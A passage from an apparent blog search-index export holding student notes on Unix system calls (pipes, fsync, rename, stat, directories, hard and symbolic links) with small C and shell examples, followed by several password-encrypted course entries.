<li>If all file descriptors referring to the <font color="f54747">read end of a pipe have been closed</font>, then a <code>write()</code> will cause a SIGPIPE signal to be generated for all the calling process.<ul>
<li>If the calling process is ignoring the signal, then <code>write()</code> fails with the error EPIPE.</li>
</ul>
</li>
</ul>
</li>
<li><p>Syntax: <code>int pipe(int* fd);</code></p>
<ul>
<li><code>fd[0]</code>: the read end</li>
<li><code>fd[1]</code>: the write end</li>
</ul>
</li>
<li><p>Return:</p>
<ul>
<li>Success: return <code>0</code></li>
<li>Error: return <code>-1</code></li>
</ul>
</li>
<li><p>Example:</p>
<ul>
<li>counting the lines of output in executing <code>ls -l</code>  <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 7-pipe */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">main()&#123;</span><br><span class="line">    <span class="type">int</span> fd[<span class="number">2</span>];</span><br><span class="line">    <span class="type">int</span> ret;</span><br><span class="line">    <span class="type">char</span> *cmd;</span><br><span class="line">    <span class="type">char</span> *argv[<span class="number">3</span>];</span><br><span class="line"></span><br><span class="line">    pipe(fd);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((ret=fork()) &gt; <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">            Parent Process</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">            We want to use parent process executes &quot;ls -l&quot;, so do redirection</span></span><br><span class="line"><span class="comment">            We want to redirect the standard output to the write end of pipe</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        close(<span class="number">1</span>);		<span class="comment">// close standard output</span></span><br><span class="line">        dup(fd[<span class="number">1</span>]);		<span class="comment">// fd[1] is duplicated to standard output</span></span><br><span class="line">        close(fd[<span class="number">0</span>]);</span><br><span class="line">        close(fd[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">        cmd = <span class="string">&quot;ls&quot;</span>;</span><br><span class="line">        argv[<span class="number">0</span>] = <span class="string">&quot;ls&quot;</span>;</span><br><span class="line">        argv[<span class="number">1</span>] = <span class="string">&quot;-l&quot;</span>;</span><br><span class="line">        argv[<span class="number">2</span>] = <span class="literal">NULL</span>;</span><br><span class="line">        execvp(cmd, argv);</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(ret == <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">            Child Process</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">            We want to use child process executes &quot;wc -l&quot;, so do redirection</span></span><br><span class="line"><span class="comment">            We want to redirect the standard input to the read end of pipe</span></span><br><span class="line"><span class="comment">                to get the input from the parent process</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        close(<span class="number">0</span>);		<span class="comment">// close standard input</span></span><br><span class="line">        dup(fd[<span class="number">0</span>]);		<span class="comment">// fd[0] is duplicated to standard input</span></span><br><span class="line">        close(fd[<span class="number">0</span>]);</span><br><span class="line">        close(fd[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">        cmd = <span class="string">&quot;wc&quot;</span>;</span><br><span class="line">        argv[<span class="number">0</span>] = <span class="string">&quot;wc&quot;</span>;</span><br><span class="line">        argv[<span class="number">1</span>] = <span class="string">&quot;-l&quot;</span>;</span><br><span class="line">        argv[<span class="number">2</span>] = <span class="literal">NULL</span>;</span><br><span class="line">        execvp(cmd, argv);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
<h2 id="Other-Operations"><a href="#Other-Operations" class="headerlink" title="Other Operations"></a>Other Operations</h2><h3 id="fsync-Write-Immdeiately"><a href="#fsync-Write-Immdeiately" class="headerlink" title="fsync Write Immdeiately"></a><code>fsync</code> Write Immdeiately</h3><ul>
<li><p>Description:</p>
<ul>
<li>The file system will buffer writes in memorys for some time, so the write(s) will actually be issued to the storage device, like data lost.</li>
<li><code>fsync</code> system call forces all dirty data written to disk immediately, and returns after all these writes were completed.</li>
</ul>
</li>
<li><p>Syntax: <code>int fsync(int fd)</code></p>
</li>
<li><p>Return:</p>
<ul>
<li>Success: return <code>0</code></li>
<li>Error: return <code>-1</code></li>
</ul>
</li>
</ul>
<h3 id="rename-Rename-File"><a href="#rename-Rename-File" class="headerlink" title="rename Rename File"></a><code>rename</code> Rename File</h3><ul>
<li><p>Syntax: <code>rename(char* old, char* new)</code></p>
</li>
<li><p>Example:</p>
  <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> fd = open(<span class="string">&quot;foo.txt.tmp&quot;</span>, O_WRONLY | O_CREAT | O_TRUNC, S_IRWXU);</span><br><span class="line"><span class="type">char</span> buffer[<span class="number">20</span>] = <span class="string">&quot;hello&quot;</span>;</span><br><span class="line">write(fd, buffer, <span class="keyword">sizeof</span>(buffer));</span><br><span class="line">fsync(fd);</span><br><span class="line">close(fd);</span><br><span class="line">rename(<span class="string">&quot;foo.txt.tmp&quot;</span>, <span class="string">&quot;foo.txt&quot;</span>);</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="fstat-Show-Information"><a href="#fstat-Show-Information" class="headerlink" title="fstat Show Information"></a><code>fstat</code> Show Information</h3><ul>
<li><p>Show the file metadata (the information about the file).</p>
</li>
<li><p>Structure:</p>
  <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">stat</span> &#123;</span></span><br><span class="line">    <span class="type">dev_t</span> st_dev; 	<span class="comment">/* ID of device containing file */</span></span><br><span class="line">    <span class="type">ino_t</span> st_ino; 	<span class="comment">/* inode number */</span></span><br><span class="line">    <span class="type">mode_t</span> st_mode; 	<span class="comment">/* protection */</span></span><br><span class="line">    <span class="type">nlink_t</span> st_nlink; 	<span class="comment">/* number of hard links */</span></span><br><span class="line">    <span class="type">uid_t</span> st_uid; 	<span class="comment">/* user ID of owner */</span></span><br><span class="line">    <span class="type">gid_t</span> st_gid; 	<span class="comment">/* group ID of owner */</span></span><br><span class="line">    <span class="type">dev_t</span> st_rdev; 	<span class="comment">/* device ID (if special file) */</span></span><br><span class="line">    <span class="type">off_t</span> st_size; 	<span class="comment">/* total size, in bytes */</span></span><br><span class="line">    <span class="type">blksize_t</span> st_blksize; <span class="comment">/* blocksize for filesystem I/O */</span></span><br><span class="line">    <span class="type">blkcnt_t</span> st_blocks; 	<span class="comment">/* number of blocks allocated */</span></span><br><span class="line">    <span class="type">time_t</span> st_atime; 	<span class="comment">/* time of last access */</span></span><br><span class="line">    <span class="type">time_t</span> st_mtime; 	<span class="comment">/* time of last modification */</span></span><br><span class="line">    <span class="type">time_t</span> st_ctime; 	<span class="comment">/* time of last status change */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

</li>
<li><p>Example:</p>
  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> hello &gt; file   <span class="comment"># create and write &quot;hello&quot; into file</span></span><br><span class="line"><span class="built_in">stat</span> file   <span class="comment"># show the information of file</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="Directories-Operations"><a href="#Directories-Operations" class="headerlink" title="Directories Operations"></a>Directories Operations</h2><ol>
<li><p>Create Directories</p>
<ul>
<li><code>mkdir</code> system call</li>
<li>Make an empty directory, which contains two entries: <code>.</code>(itself) and <code>..</code>(parent).</li>
</ul>
</li>
<li><p>Read Directories</p>
<ul>
<li><code>opendir</code> system call: open directory</li>
<li><code>readdir</code> system call: read directory entries (similar to <code>ls</code>).</li>
</ul>
</li>
<li><p>Remove Directories</p>
<ul>
<li><code>rmdir</code> system call</li>
<li><font color="f54747">It requires the directory is empty</font>.</li>
</ul>
</li>
</ol>
<ul>
<li>Example:  <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;dirent.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span>&#123;</span><br><span class="line">    DIR *dp = opendir(<span class="string">&quot;.&quot;</span>);             <span class="comment">// open current directory</span></span><br><span class="line">    assert(dp != <span class="literal">NULL</span>);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">dirent</span> *<span class="title">d</span>;</span></span><br><span class="line">    <span class="keyword">while</span> ((d = readdir(dp)) != <span class="literal">NULL</span>)   <span class="comment">// read one directory entry </span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// print outthe name and inode number of each file</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d %s\n&quot;</span>, (<span class="type">int</span>) d-&gt;d_ino, d-&gt;d_name);</span><br><span class="line">    &#125;</span><br><span class="line">    closedir(dp);                       <span class="comment">// close current directory</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="Links"><a href="#Links" class="headerlink" title="Links"></a>Links</h2><h3 id="Hard-Links"><a href="#Hard-Links" class="headerlink" title="Hard Links"></a>Hard Links</h3><ul>
<li><p>Description:</p>
<ul>
<li><p>Creare another name in the directory and refer it to the <font color="f54747">same inode number (same file)</font> of the original file.</p>
</li>
<li><p>Noted: <font color="f54747">Hard link does not really create a file, it just creates a link which linking to the original file</font>.</p>
</li>
<li><p>Editting the old file would change the content in new file.</p>
  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> hello &gt; file</span><br><span class="line"><span class="built_in">ln</span> file file2       <span class="comment"># create a hard link, link file to file2</span></span><br><span class="line"><span class="built_in">echo</span> helloworld &gt; file</span><br><span class="line"><span class="built_in">cat</span> file2           <span class="comment"># helloworld</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">ls</span> -i file file2</span><br><span class="line">4633749 file	4633749 file2   <span class="comment"># they have the same inode value</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>Syntax: </p>
<ul>
<li>system call: <code>link(char* &quot;oldpath&quot;, char* &quot;newpath&quot;);</code></li>
<li>command: <code>ln oldpath newpath</code></li>
</ul>
</li>
<li><p>Remove File:</p>
<ul>
<li>That’s why we call <code>unlink</code> to remove file.  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> hello &gt; file</span><br><span class="line"><span class="built_in">ln</span> file file2       <span class="comment"># create a hard link, link file2 to file</span></span><br><span class="line"><span class="built_in">rm</span> file             <span class="comment"># remove file</span></span><br><span class="line"><span class="built_in">cat</span> file2           <span class="comment"># file2 can still access the file</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
<h3 id="Symbolic-Links-Soft-Link"><a href="#Symbolic-Links-Soft-Link" class="headerlink" title="Symbolic Links (Soft Link)"></a>Symbolic Links (Soft Link)</h3><ul>
<li><p>Description:</p>
<ul>
<li>It can create for a directory (hard link cannot).  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> foo</span><br><span class="line"><span class="built_in">ln</span> foo foo1     <span class="comment"># ln: foo: Is a directory</span></span><br><span class="line"><span class="built_in">ln</span> -s foo foo1</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>Difference:</p>
<ol>
<li>File system knows that symbolic link is a <font color="f54747">third type</font> (different type), so <font color="f54747">symbolic link does just create a new file</font>.</li>
<li>The size of symbolic link is <font color="f54747">4 bytes</font> <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">ls</span> -a</span><br><span class="line"><span class="comment"># -rw-r--r--   ...   6   file</span></span><br><span class="line"><span class="comment"># lrwxr-xr-x   ...   4   file2 -&gt; file</span></span><br></pre></td></tr></table></figure></li>
</ol>
</li>
<li><p>Remove File:</p>
<ul>
<li>When the original file was removed, symbolic link points nothing  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> hello &gt; file</span><br><span class="line"><span class="built_in">ln</span> -s file file2</span><br><span class="line"><span class="built_in">rm</span> file</span><br><span class="line"><span class="built_in">cat</span> file2           <span class="comment"># cat: file2: No such file or directory</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>CSCI3150</category>
      </categories>
  </entry>
  <entry>
    <title>CSCI3180 - Expressions and Assignment Statements</title>
    <url>/myBlog/2023/03/13/2023/CSCI3180/2023-3-13-CSCI3180-Expressions-Assignment-Statements/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="5b8ad46bad4be0a59890d2e54d720cf388f28444e9e4f18c0e8abf4d892b32c7"></script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/myBlog/lib/hbe.js"></script><link href="/myBlog/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>CSCI3180</category>
      </categories>
      <tags>
        <tag>CSCI3180</tag>
      </tags>
  </entry>
  <entry>
    <title>CSCI3180 - Statement-Level Control Structures</title>
    <url>/myBlog/2023/04/26/2023/CSCI3180/2023-4-26-CSCI3180-Statement-Level-Control-Structures/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="d047f03920490c96402965f7abdc1630feb46a1c583643377833af824f25c8e3"></script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/myBlog/lib/hbe.js"></script><link href="/myBlog/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>CSCI3180</category>
      </categories>
      <tags>
        <tag>CSCI3180</tag>
      </tags>
  </entry>
  <entry>
    <title>CSCI3180 - Subprogram</title>
    <url>/myBlog/2023/04/27/2023/CSCI3180/2023-4-27-CSCI3180-Subprogram/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="e06fef58afbf6898757f9a842205259b00060182e7344fc181ecfc62a8726742"></script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/myBlog/lib/hbe.js"></script><link href="/myBlog/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>CSCI3180</category>
      </categories>
      <tags>
        <tag>CSCI3180</tag>
      </tags>
  </entry>
  <entry>
    <title>CSCI3180 - Logic Programming</title>
    <url>/myBlog/2023/04/28/2023/CSCI3180/2023-4-28-CSCI3180-Logic-Programming/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="fcb998bfdf69f01152b13d65bcf0cd6625b6fefff653633bcd7c73a15bbeee93"></script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/myBlog/lib/hbe.js"></script><link href="/myBlog/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>CSCI3180</category>
      </categories>
      <tags>
        <tag>CSCI3180</tag>
      </tags>
  </entry>
  <entry>
    <title>CSCI3180 - Functional Programming</title>
    <url>/myBlog/2023/04/29/2023/CSCI3180/2023-4-29-CSCI3180-Functional-Programming/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="4c945a81abbca8230215dbb6e59218873f74963c7c45232ee57ed69b4585d6f1"></script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/myBlog/lib/hbe.js"></script><link href="/myBlog/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>CSCI3180</category>
      </categories>
      <tags>
        <tag>CSCI3180</tag>
      </tags>
  </entry>
</search>
